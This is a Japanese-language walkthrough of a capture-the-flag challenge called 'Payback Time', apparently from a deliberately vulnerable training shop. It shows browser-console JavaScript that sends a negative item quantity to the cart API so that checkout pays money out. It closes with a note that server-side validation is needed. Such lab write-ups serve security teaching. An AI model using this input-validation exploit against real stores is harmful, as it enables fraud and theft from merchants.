# Payback Time ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** 入力検証
**目標:** 商品の数量を負の値にして、お金をもらう

---

## 思考プロセス

**ステップ1: 入力検証の穴を探す**
```
「カートの数量を変更できる」
    ↓
「画面上では 1, 2, 3... と正の数しか選べない」
    ↓
「でもAPIに直接リクエストを送ったら負の数は？」
```

**ステップ2: APIの動作を確認**
```
「Network タブでカート更新のリクエストを観察」
    ↓
「PUT /api/BasketItems/6 に {quantity: 2} など」
    ↓
「これを {quantity: -100} にしてみる」
```

**ステップ3: 結果の確認**
```
「APIは負の数量を受け入れた！」
    ↓
「カートの合計金額がマイナスになる」
    ↓
「チェックアウトすると "返金" される」
```

## 実行手順

1. ログインして、何か商品をカートに追加
2. `F12` → Network タブを開く
3. カートページを開いて、リクエストから BasketItem ID を確認
4. Console で以下を実行:
   ```javascript
   // BasketItemのIDを取得
   const basket = await fetch('/rest/basket/' + localStorage.getItem('bid'), {
     headers: {'Authorization': 'Bearer ' + localStorage.getItem('token')}
   }).then(r => r.json());
   const basketItemId = basket.data.Products[0].BasketItem.id;

   // 数量を負の値に変更
   fetch('/api/BasketItems/' + basketItemId, {
     method: 'PUT',
     headers: {
       'Content-Type': 'application/json',
       'Authorization': 'Bearer ' + localStorage.getItem('token')
     },
     body: JSON.stringify({quantity: -100})
   }).then(r => r.json()).then(console.log)
   ```
5. カートを確認すると、合計金額がマイナスになっている
6. チェックアウトで「返金」される

## 解説

**なぜこれが危険？**
```
価格 1000円 × 数量 -100 = -100,000円
→ ストアから 100,000円 もらえることになる
```

- フロントエンドの検証だけでは不十分
- サーバー側でも数量の範囲チェックが必要

## 関連チャレンジ

- [Zero Stars](../difficulty-1/zero-stars.md)
- [Repetitive Registration](../difficulty-1/repetitive-registration.md)
